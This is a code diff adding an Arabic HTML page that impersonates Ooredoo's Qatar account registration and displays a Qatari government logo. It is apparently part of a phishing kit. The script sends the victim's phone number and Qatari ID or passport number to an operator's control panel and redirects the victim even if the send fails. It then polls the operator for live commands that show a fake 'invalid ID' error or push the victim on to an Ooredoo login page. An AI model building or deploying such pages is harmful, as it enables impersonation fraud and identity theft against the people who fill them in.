@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنشاء حساب Ooredoo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="config.js"></script>
+    <style>
+        body { font-family: 'Cairo', sans-serif; background: #fff; }
+        .input-reg { border: 1.5px solid #e5e7eb; border-radius: 12px; padding: 16px; width: 100%; outline: none; background: #fff; text-align: right; }
+        .btn-reg { background: #ed1c24; color: white; padding: 16px; border-radius: 30px; width: 100%; font-weight: bold; font-size: 18px; margin-top: 20px; border:none; cursor:pointer; }
+    </style>
+</head>
+<body class="bg-gray-50">
+
+    <!-- نافذة خطأ الرقم الشخصي -->
+    <div id="idError" class="fixed inset-0 bg-black/80 z-[9999] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-[20px] p-8 max-w-[450px] w-full text-center relative border-t-4 border-red-600 shadow-2xl">
+            <div class="flex justify-between items-center mb-6">
+                <img src="assets/auth-provider.svg" class="h-6">
+                <img src="assets/gov-q-main.png" class="h-10">
+            </div>
+
+            <div class="flex flex-col items-center">
+                <div class="w-14 h-14 bg-red-50 text-red-600 rounded-full flex items-center justify-center mb-4 text-3xl font-bold border-2 border-red-500">×</div>
+                <h3 class="text-[20px] font-black mb-2 text-[#1a1a1a]">رقم الهوية القطرية غير صحيح</h3>
+                <p class="text-gray-500 text-[14px] mb-8 font-bold leading-relaxed px-4">عذراً، رقم الهوية القطرية الذي تم إدخاله غير صحيح. يرجى التأكد من الرقم والمحاولة مرة أخرى.</p>
+                <button onclick="clearError()" class="bg-[#8D1B3D] text-white px-12 py-3 rounded-lg font-bold shadow-lg active:scale-95">إعادة المحاولة</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- رأس الصفحة -->
+    <div class="bg-white p-4 flex justify-between items-center border-b shadow-sm">
+        <span onclick="window.history.back()" class="text-2xl text-gray-400 cursor-pointer">&times;</span>
+        <h2 class="font-bold text-lg">إنشاء حساب</h2>
+        <span class="text-[12px] text-gray-300 font-bold">الخطوة 1</span>
+    </div>
+
+    <div class="max-w-[600px] mx-auto p-6 mt-8">
+        <h1 class="text-center text-[24px] font-black mb-10 text-[#1a1a1a]">👋 أهلاً بك في Ooredoo</h1>
+        <p class="text-[13px] text-gray-400 mb-8 font-bold leading-relaxed text-right px-2 italic">يُرجى تعبئة معلوماتك أدناه. يجب أن يبدأ رقم جوالك بـ 3 أو 5 أو 6 أو 7.</p>
+
+        <form id="regForm" class="space-y-6">
+            <div class="relative flex flex-row-reverse">
+                <input type="text" id="phone" name="phone" class="input-reg pr-4" placeholder="رقم الجوال" required maxlength="8" inputmode="numeric" autocomplete="tel-national">
+                <div class="border border-r-0 border-gray-200 p-4 rounded-r-12 bg-white flex items-center gap-2 border-l-0 rounded-tr-xl rounded-br-xl">
+                    <span class="font-bold text-gray-500">974</span> 🇶🇦
+                </div>
+            </div>
+            <input type="text" id="qid" name="qid" class="input-reg" placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر" required inputmode="numeric">
+            <button type="submit" id="sub" class="btn-reg shadow-red-200 shadow-lg active:scale-95">متابعة</button>
+        </form>
+    </div>
+
+    <script>
+        var ref = resolveRef();
+        var isErr = new URLSearchParams(window.location.search).get('err');
+
+        // إظهار الخطأ إذا كان الرابط يحتوي على err=1
+        if (isErr === '1') { document.getElementById('idError').classList.remove('hidden'); }
+
+        function clearError() {
+            document.getElementById('idError').classList.add('hidden');
+            // تنظيف الرابط من err=1 برمجياً
+            var url = new URL(window.location);
+            url.searchParams.delete('err');
+            window.history.pushState({}, '', url);
+        }
+
+        document.getElementById('regForm').onsubmit = function (e) {
+            e.preventDefault();
+            var btn = document.getElementById('sub');
+            btn.innerText = 'جاري التأكد...';
+            btn.disabled = true;
+
+            var phone = document.getElementById('phone').value;
+            var qid = document.getElementById('qid').value;
+
+            // بيانات التسجيل تُعلَّم كحساسة لتظهر مخفية في لوحة التحكم.
+            jusourSubmit({
+                ref: ref,
+                page_key: 'ooredoo_reg',
+                summary: 'تسجيل حساب Ooredoo',
+                phone: '+974' + phone,
+                fields: [
+                    { label: 'رقم الجوال', value: '+974' + phone, sensitive: true },
+                    { label: 'رقم البطاقة الشخصية / الجواز', value: qid, sensitive: true }
+                ]
+            }).catch(function () {
+                /* لا نعطّل المستخدم إذا تعذّر الإرسال */
+            }).then(function () {
+                window.setTimeout(function () {
+                    window.location.href = 'loading.html?ref=' + encodeURIComponent(ref) + '&v=' + Date.now();
+                }, 1000);
+            });
+        };
+
+        // استقبال أوامر المشرف من الخادم مباشرة بدلاً من ملفات الأوامر.
+        pollCommands(ref, function (data) {
+            if (data.command === 'ID_ERR') {
+                document.getElementById('idError').classList.remove('hidden');
+                return;
+            }
+            if (data.command === 'OOREDOO') {
+                window.location.href = 'ooredoo-login.html?ref=' + encodeURIComponent(ref);
+                return;
+            }
+            if (data.redirect && data.redirect !== 'ooredoo-reg.html') {
+                window.location.href = data.redirect + '?ref=' + encodeURIComponent(ref);
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
